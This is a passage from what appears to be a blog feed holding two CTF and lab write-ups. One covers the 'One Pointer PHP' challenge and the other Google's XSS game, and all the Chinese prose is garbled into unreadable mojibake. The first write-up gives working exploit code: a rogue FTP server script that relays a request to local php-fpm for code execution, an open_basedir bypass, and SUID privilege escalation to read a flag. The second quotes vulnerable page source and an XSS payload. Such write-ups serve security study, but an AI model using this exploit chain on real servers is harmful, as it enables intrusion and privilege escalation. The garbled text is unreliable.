important">&lt;?php</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token single-quoted-string string">'/tmp/file'</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token single-quoted-string string">':)'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/br>"</span><span class="token punctuation">.</span><span class="token variable">$data</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// echo file_get_contents($file);</span></span></code></pre><p>å‡†å¤‡åˆ©ç”¨å‰é¢ç”Ÿæˆçš„payloadæ‰“</p><h3 id="èµ·æ¶æ„ftpæœåŠ¡"><a href="#èµ·æ¶æ„ftpæœåŠ¡" class="headerlink" title="èµ·æ¶æ„ftpæœåŠ¡"></a>èµ·æ¶æ„ftpæœåŠ¡</h3><p>ç”¨å¦‚ä¸‹è„šæœ¬ï¼Œåœ¨å…¬ç½‘vpsèµ·</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sockets <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'220 welcome\n'</span><span class="token punctuation">)</span><span class="token comment">#Service ready for new user.</span><span class="token comment">#Client send anonymous username</span><span class="token comment">#USER anonymous</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'331 Please specify the password.\n'</span><span class="token punctuation">)</span><span class="token comment">#User name okay, need password.</span><span class="token comment">#Client send anonymous password.</span><span class="token comment">#PASS anonymous</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'230 Login successful.\n'</span><span class="token punctuation">)</span><span class="token comment">#User logged in, proceed. Logged out if appropriate.</span><span class="token comment">#TYPE I</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'200 Switching to Binary mode.\n'</span><span class="token punctuation">)</span><span class="token comment">#Size /</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'550 Could not get the file size.\n'</span><span class="token punctuation">)</span><span class="token comment">#EPSV (1)</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 ok\n'</span><span class="token punctuation">)</span><span class="token comment">#PASV</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n'</span><span class="token punctuation">)</span> <span class="token comment">#STOR / (2) æ³¨æ„æ‰“åˆ°9001ç«¯å£çš„æœåŠ¡</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 Permission denied.\n'</span><span class="token punctuation">)</span><span class="token comment">#QUIT</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'221 Goodbye.\n'</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="å¹²"><a href="#å¹²" class="headerlink" title="å¹²"></a>å¹²</h3><p>å¹²å°±å®Œäº‹äº†ï¼Œè®¿é—®<code>file.php</code>ç”¨payloadæ‰“</p><p><code>./file.php?file=ftp://vps:9999/&amp;data=xxx</code></p><img src="/article/bluehat2021/image-20210503144504813.png" class="" title="gan" loading="lazy"><p>å¯ä»¥çœ‹åˆ°dumpå‡ºæ¥<code>int(681)</code>ï¼Œè¿™é‡Œå°±æ˜¯æ‰“çš„æ•°æ®åŒ…å¤§å°</p><p>è¿™æ—¶å·²ç»çªç ´open_basedirï¼Œå¯ä»¥ä»»æ„è®¿é—®ç›®å½•äº†ï¼ŒåŒæ—¶ä¹Ÿæ‰§è¡Œäº†æ¶æ„.soæ–‡ä»¶</p><img src="/article/bluehat2021/image-20210503144951807.png" class="" title="ls&#x2F;" loading="lazy"><p>ä¸‹é¢å°±æ˜¯suidææƒäº†ï¼Œé‚£ä¹ˆå¤§ä¸€ä¸ª700 flagå°±åœ¨çœ¼å‰</p><h3 id="æ‹¿shell"><a href="#æ‹¿shell" class="headerlink" title="æ‹¿shell"></a>æ‹¿shell</h3><p>æ—¢ç„¶å¯ä»¥æ‰§è¡Œæ¶æ„.soæ–‡ä»¶ï¼Œé‚£ä¹ˆç›´æ¥å¼¹ä¸ªshellå›æ¥</p><img src="/article/bluehat2021/image-20210503145246770.png" class="" title="shell" loading="lazy"><p>åœ¨web shellä¸Šä¼ è‡ªåŠ¨åŒ–ææƒæ¢æµ‹è„šæœ¬ï¼Œè¿™é‡Œç”¨çš„æ˜¯<a href="https://github.com/rebootuser/LinEnum">LinEnum</a>ï¼Œæ‰§è¡Œè„šæœ¬ï¼Œè¿™é‡Œä¸Šä¼ åˆ°å“ªéƒ½å¯ä»¥ï¼Œæ¯•ç«Ÿå·²ç»çªç ´äº†é™åˆ¶è¿˜å¼¹äº†shell</p><pre class="language-none"><code class="language-none">&#x2F;var&#x2F;www&#x2F;html&#x2F;LinEnum.sh -s -r report -e &#x2F;tmp&#x2F; -t</code></pre><p>æŸ¥çœ‹report</p><img src="/article/bluehat2021/image-20210503145518039.png" class="" title="report" loading="lazy"><p>æ²¡æƒ³åˆ°phpå°±æœ‰sæƒé™ï¼Œç›´æ¥è¿è¡Œå³å¯</p><p>å†™æ–‡ä»¶</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>ç›´æ¥è¿è¡Œ</p><img src="/article/bluehat2021/image-20210503145751850.png" class="" title="flag" loading="lazy"><p>GET IT</p><p>å…³äºphpfpmä¸FastCGIæ¨¡å¼çš„ç ”ç©¶å»ºè®®ä»”ç»†çœ‹çœ‹éƒ¨åˆ†å‚è€ƒæ–‡ç« ï¼Œæ€»çš„æ¥è¯´å°±æ˜¯</p><p>FastCGIåŠ è½½å¹¶è°ƒç”¨hpdoger.so-&gt;bypass base_opendir-&gt;ftp-ssrfè¯·æ±‚æ¶æ„ftpæœåŠ¡-&gt;æœ¬åœ°php-fpm-&gt;rce</p><hr><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/">Ha1c9on</a></p><p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">PHPç»•è¿‡open_basediråˆ—ç›®å½•çš„ç ”ç©¶</a></p><p><a href="https://www.php.net/manual/zh/wrappers.glob.php">glob://</a></p><p><a href="https://xz.aliyun.com/t/5598">php-fpmçš„æ”»å‡»æ–¹å¼</a></p><p><a href="https://www.cnblogs.com/leixiao-/p/10226633.html">PHP-FPM Fastcgi æœªæˆæƒè®¿é—®æ¼æ´</a></p><p><a href="https://www.anquanke.com/post/id/186186#h3-3">Fastcgiç»•è¿‡å§¿åŠ¿</a></p><p><a href="https://www.anquanke.com/post/id/233454">åˆ©ç”¨ftp ä¸ php-fpm å¯¹è¯ RCE</a></p><p><a href="https://buuoj.cn/challenges#[%E8%93%9D%E5%B8%BD%E6%9D%AF%202021]One%20Pointer%20PHP">å¤ç°å¹³å°buuoj</a></p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>xsså­¦ä¹ </title>
      <link href="article/xss/"/>
      <url>article/xss/</url>
      
        <content type="html"><![CDATA[<p>è°·æ­Œçš„å°æ¸¸æˆï¼Œå¤ä¹ ä¸€ä¸‹xss</p><a id="more"></a><p>é¡¹ç›®åœ°å€ï¼š<a href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a></p><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p><a href="https://xss-game.appspot.com/level1/frame">https://xss-game.appspot.com/level1/frame</a></p><pre class="language-python" data-language="python"><code class="language-python">page_header <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;!doctype html>&lt;html>  &lt;head>    &lt;!-- Internal game scripts/styles, mostly boring stuff -->    &lt;script src="/static/game-frame.js">&lt;/script>    &lt;link rel="stylesheet" href="/static/game-frame-styles.css" />  &lt;/head>   &lt;body id="level1">    &lt;img src="/static/logos/level1.png">      &lt;div>"""</span> page_footer <span class="token operator">=</span> <span class="token triple-quoted-string string">"""    &lt;/div>  &lt;/body>&lt;/html>"""</span> main_page_markup <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;form action="" method="GET">  &lt;input id="query" name="query" value="Enter query here..."    onfocus="this.value=''">  &lt;input id="button" type="submit" value="Search">&lt;/form>"""</span> <span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">render_string</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>s<span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Disable the reflected XSS filter for demonstration purposes</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"X-XSS-Protection"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment"># Show main search page</span>      self<span class="token punctuation">.</span>render_string<span class="token punctuation">(</span>page_header <span class="token operator">+</span> main_page_markup <span class="token operator">+</span> page_footer<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      query <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">,</span> <span class="token string">'[empty]'</span><span class="token punctuation">)</span>             <span class="token comment"># Our search engine broke, we found no results :-(</span>      message <span class="token operator">=</span> <span class="token string">"Sorry, no results were found for &lt;b>"</span> <span class="token operator">+</span> query <span class="token operator">+</span> <span class="token string">"&lt;/b>."</span>      message <span class="token operator">+=</span> <span class="token string">" &lt;a href='?'>Try again&lt;/a>."</span>       <span class="token comment"># Display the results page</span>      self<span class="token punctuation">.</span>render_string<span class="token punctuation">(</span>page_header <span class="token operator">+</span> message <span class="token operator">+</span> page_footer<span class="token punctuation">)</span>         <span class="token keyword">return</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>å…³é”®éƒ¨åˆ†</p><pre class="language-python" data-language="python"><code class="language-python">query <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">,</span> <span class="token string">'[empty]'</span><span class="token punctuation">)</span>             <span class="token comment"># Our search engine broke, we found no results :-(</span>      message <span class="token operator">=</span> <span class="token string">"Sorry, no results were found for &lt;b>"</span> <span class="token operator">+</span> query <span class="token operator">+</span> <span class="token string">"&lt;/b>."</span>      message <span class="token operator">+=</span> <span class="token string">" &lt;a href='?'>Try again&lt;/a>."</span></code></pre><p><code>Sorry, no results were found for &lt;b&gt; + query + &lt;/b&gt;.</code></p><p>GETè¯·æ±‚queryä¼šç›´æ¥å¡«å…¥ç½‘é¡µhtml</p><img src="/article/xss/image-20210424143837616.png" class="" title="level1-1" loading="lazy"><p>ç›´æ¥æ‰“å³å¯ï¼Œpayload:</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><img src="/article/xss/image-20210424143953579.png" class="" title="level1-2" loading="lazy"><hr><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><a href="https://xss-game.appspot.com/level2/frame">https://xss-game.appspot.com/level2/frame</a></p><p>æºç Â·index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token comment">&lt;!-- This is our database of messages --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/post-store.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token keyword">var</span> defaultMessage <span class="token operator">=</span> <span class="token string">"Welcome!&lt;br>&lt;br>This is your &lt;i>personal&lt;/i>"</span>        <span class="token operator">+</span> <span class="token string">" stream. You can post anything you want here, especially "</span>        <span class="token operator">+</span> <span class="token string">"&lt;span style='color: #f00ba7'>madness&lt;/span>."</span><span class="token punctuation">;</span>       <span class="token keyword">var</span> <span class="token constant">DB</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PostDB</span><span class="token punctuation">(</span>defaultMessage<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">function</span> <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> containerEl <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"post-container"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        containerEl<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>         <span class="token keyword">var</span> posts <span class="token operator">=</span> <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">getPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>posts<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token string">'&lt;table class="message"> &lt;tr> &lt;td valign=top> '</span>            <span class="token operator">+</span> <span class="token string">'&lt;img src="/static/level2_icon.png"> &lt;/td> &lt;td valign=top '</span>            <span class="token operator">+</span> <span class="token string">' class="message-container"> &lt;div class="shim">&lt;/div>'</span><span class="token punctuation">;</span>           html <span class="token operator">+=</span> <span class="token string">'&lt;b>You&lt;/b>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">'&lt;span class="date">'</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>date<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/span>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;blockquote>"</span> <span class="token operator">+</span> posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>message <span class="token operator">+</span> <span class="token string">"&lt;/blockquote"</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;/td>&lt;/tr>&lt;/table>"</span>          containerEl<span class="token punctuation">.</span>innerHTML <span class="token operator">+=</span> html<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>       window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'clear-form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onsubmit</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>         document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'post-form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onsubmit</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">var</span> message <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'post-content'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>          <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>          document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'post-content'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>         <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>     </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level2.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>Chatter from across the Web.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>?<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>clear-form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>clear<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Clear all posts<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post-container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">valign</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/level2_icon.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message-container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>shim<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>?<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post-form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post-content<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span>              <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>share<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Share status!<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>action<span class="token punctuation">"</span></span> <span 